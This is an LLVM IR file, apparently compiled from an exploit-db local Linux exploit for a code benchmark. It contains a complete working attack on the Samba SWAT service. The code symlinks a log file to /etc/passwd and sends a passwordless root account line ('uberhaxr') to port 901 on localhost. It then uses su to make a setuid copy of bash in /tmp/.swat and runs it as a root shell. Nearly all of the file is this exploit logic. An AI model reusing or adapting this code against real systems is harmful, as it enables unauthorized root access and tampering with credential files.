; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20338.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20338.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [24 x i8] c"backing up /etc/passwd\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"cp -pd /etc/passwd /tmp/.bak\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"touch -r /etc/passwd /tmp/.bak\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c"/bin/ln -sf /etc/passwd /tmp/cgi.log\00", align 1
@.str.4 = private unnamed_addr constant [56 x i8] c"error, /tmp/cgi.log could not be linked to /etc/passwd\0A\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/tmp/.bak\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"connecting to swat\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [32 x i8] c"error, could not create socket\0A\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"/tmp/cgi.log\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.10 = private unnamed_addr constant [31 x i8] c"error, cannot connect to swat\0A\00", align 1
@.str.11 = private unnamed_addr constant [45 x i8] c"uberhaxr::0:0:optyx r0x y3r b0x:/:/bin/bash\0A\00", align 1
@.str.12 = private unnamed_addr constant [47 x i8] c"su -l uberhaxr -c \22cp -f /bin/bash /tmp/.swat\22\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"exploit failed\0A\00", align 1
@.str.14 = private unnamed_addr constant [41 x i8] c"su -l uberhaxr -c \22chmod u+s /tmp/.swat\22\00", align 1
@.str.15 = private unnamed_addr constant [23 x i8] c"restoring /etc/passwd\0A\00", align 1
@REALLY_FUCKING_LONG_COMMAND = common dso_local global i8* null, align 8
@.str.16 = private unnamed_addr constant [41 x i8] c"got root? (might want to rm /tmp/.swat)\0A\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"/tmp/.swat\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %1, align 4
  %5 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %6 = call i64 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %7 = call i64 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0))
  %8 = call i64 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0))
  %9 = icmp sgt i64 %8, 0
  br i1 %9, label %10, label %14

10:                                               ; preds = %0
  %11 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.4, i64 0, i64 0))
  %12 = call i32 @unlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %13 = call i32 @exit(i32 -1) #3
  unreachable

14:                                               ; preds = %0
  %15 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %16 = load i32, i32* @PF_INET, align 4
  %17 = load i32, i32* @SOCK_STREAM, align 4
  %18 = load i32, i32* @IPPROTO_TCP, align 4
  %19 = call i32 @socket(i32 %16, i32 %17, i32 %18)
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 0
  br i1 %21, label %22, label %27

22:                                               ; preds = %14
  %23 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %24 = call i32 @unlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %25 = call i32 @unlink(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %26 = call i32 @exit(i32 -1) #3
  unreachable

27:                                               ; preds = %14
  %28 = load i32, i32* @PF_INET, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 2
  store i32 %28, i32* %29, align 4
  %30 = call i32 @htons(i32 901)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 1
  store i32 %30, i32* %31, align 4
  %32 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0))
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i32 0, i32 0
  %34 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %33, i32 0, i32 0
  store i32 %32, i32* %34, align 4
  %35 = load i32, i32* %3, align 4
  %36 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %37 = call i32 @connect(i32 %35, %struct.sockaddr* %36, i32 12)
  store i32 %37, i32* %2, align 4
  %38 = load i32, i32* %2, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %45

40:                                               ; preds = %27
  %41 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0))
  %42 = call i32 @unlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %43 = call i32 @unlink(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %44 = call i32 @exit(i32 -1) #3
  unreachable

45:                                               ; preds = %27
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @send(i32 %46, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.11, i64 0, i64 0), i32 1024, i32 0)
  %48 = load i32, i32* %3, align 4
  %49 = call i32 @close(i32 %48)
  %50 = call i64 @system(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.12, i64 0, i64 0))
  %51 = icmp sgt i64 %50, 0
  br i1 %51, label %52, label %57

52:                                               ; preds = %45
  %53 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i64 0, i64 0))
  %54 = call i32 @unlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %55 = call i32 @unlink(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %56 = call i32 @exit(i32 -1) #3
  unreachable

57:                                               ; preds = %45
  %58 = call i64 @system(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.14, i64 0, i64 0))
  %59 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.15, i64 0, i64 0))
  %60 = load i8*, i8** @REALLY_FUCKING_LONG_COMMAND, align 8
  %61 = call i64 @system(i8* %60)
  %62 = call i32 @unlink(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %63 = call i32 @unlink(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %64 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.16, i64 0, i64 0))
  %65 = call i64 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @system(i8*) #1

declare dso_local i32 @unlink(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
